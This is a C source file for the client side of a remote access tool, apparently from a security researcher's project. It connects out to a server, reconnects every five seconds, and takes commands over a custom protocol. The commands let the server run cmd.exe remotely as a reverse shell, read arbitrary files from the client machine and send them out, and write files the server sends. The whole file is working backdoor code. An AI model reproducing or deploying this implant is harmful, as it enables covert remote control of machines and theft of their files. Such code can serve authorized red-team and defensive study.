/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "s3.h"

/**F*****************************************************************/
DWORD c_get (spp_ctx *c, char *path)
/**
 * PURPOSE : open file on client system and send to server
 *
 * RETURN :  spp error code
 *
 * NOTES :   None
 *
 *F*/
{
  HANDLE  in;
  spp_blk out;
  int     r;
  
  DEBUG_PRINT("opening %s for read", path);
  in=CreateFile (path, GENERIC_READ, FILE_SHARE_READ, 
    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  
  // tell server status of open
  out.err=GetLastError();
  out.len=sizeof(DWORD);
  DEBUG_PRINT("error code %i", out.err);
  r=spp_send(c, &out);
  
  // file opened?
  if (in!=INVALID_HANDLE_VALUE)
  {
    DEBUG_PRINT("reading contents");
    // while reading
    while (ReadFile (in, out.buf, SPP_DATA_LEN, &out.len, 0)) 
    {
      // send data even if nothing read.
      if ((r=spp_send(c, &out)) != SPP_ERR_OK) break;
      
      // break on nothing read
      if (out.len==0) break;
    }
    // close file
    CloseHandle (in);
  }
  DEBUG_PRINT("c_get ending");
  return r;
}

/**F*****************************************************************/
DWORD c_put (spp_ctx *c, char *path)
/**
 * PURPOSE : receive a file from remote system and write to disk
 *
 * RETURN :  spp error code
 *
 * NOTES :   None
 *
 *F*/
{
  HANDLE  out;
  DWORD   wn;
  spp_blk in;
  int     r;
  
  DEBUG_PRINT("creating %s", path);
  
  out=CreateFile (path, GENERIC_WRITE, 0, NULL, 
    CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
  
  // tell remote our last error
  in.err=GetLastError();
  in.len=sizeof(DWORD);
  DEBUG_PRINT("error code %i", in.err);
  r=spp_send(c, &in);
    
  // if unable to create
  if (out!=INVALID_HANDLE_VALUE)
  {
    // keep looping until we receive zero length or socket error
    for (;;) 
    {
      // receive data, break on error
      if ((r=spp_recv(c, &in)) != SPP_ERR_OK) 
        break;
      
      // break if zero length
      if (in.len==0) break;
      
      // else write to file
      WriteFile (out, in.buf, in.len, &wn, 0);
    }
    // close handle
    CloseHandle (out);
  }
  DEBUG_PRINT("c_put ending");
  return r;
}

/**F*****************************************************************/
int dispatch (spp_ctx *c)
/**
 * PURPOSE : receives commands from remote server
 *
 * RETURN :  1 to terminate else 0
 *
 * NOTES :   
 *
 *F*/
{
  DWORD   e, terminate=0, end=0;
  spp_blk in;
  DWORD   sck_evt;
  HANDLE  evt[MAXIMUM_WAIT_OBJECTS];
  DWORD   evt_cnt=0;
  
  evt[sck_evt = evt_cnt++] = WSACreateEvent();
  
  do {
    // wait for event
    e=wait_evt(evt, evt_cnt, sck_evt, c->s);
    
    // failure? exit
    if (e == -1) {
      printf ("[ wait_evt() failure : returned %08X\n", e);
      return 0;
    }
    // receive packet
    if (spp_recv(c, &in) != SPP_ERR_OK) {
      break;
    }
    // inspect packet
    switch (in.cmd.opt)
    {
      // terminate client
      case SPP_CMD_TERM : {
        DEBUG_PRINT("received command to terminate");
        terminate=1;
        break;
      }
      // close the connection
      case SPP_CMD_CLOSE : {
        DEBUG_PRINT("received command to close connection");
        end=1;
        break;
      }
      // execute cmd.exe for remote server
      case SPP_CMD_SHELL : {
        DEBUG_PRINT("received command to execute cmd.exe");
        cmd(c);
        break;
      }
      // send a file to remote server
      // buf should contain the name of file to open
      case SPP_CMD_GET : {
        DEBUG_PRINT("received command to send file");
        c_get(c, in.cmd.buf);
        break;
      }
      // receive a file from remote server
      // buf should contain the name of file to create
      case SPP_CMD_PUT : {
        DEBUG_PRINT("received command to receive file");
        c_put(c, in.cmd.buf);
        break;
      }
      default:
        DEBUG_PRINT("unknown command received %08X", in.cmd.opt);
        break;
    }
    // continue until close or terminate
  } while (!end && !terminate);
  return terminate;
}
  
// connect to server
void client(args_t *p)
{
  spp_ctx c;
  int     term=0;
  
  do
  {
    // create socket
    p->s=socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (p->s!=SOCKET_ERROR)
    {
      printf ("[ connecting to %s\n", addr2ip(p));
      if (connect (p->s, p->ai_addr, p->ai_addrlen)!=SOCKET_ERROR)
      {
        printf ("[ connected\n");
        c.s=p->s;
        term = dispatch(&c);
        printf ("[ closing connection\n");
      } else {
        xstrerror ("connect");
      }
      shutdown (p->s, SD_BOTH);
      closesocket (p->s);
    }
    if (!term) {
      Sleep (5000); // sleep for 5 seconds, then try again
    }
  } while (!term);
}
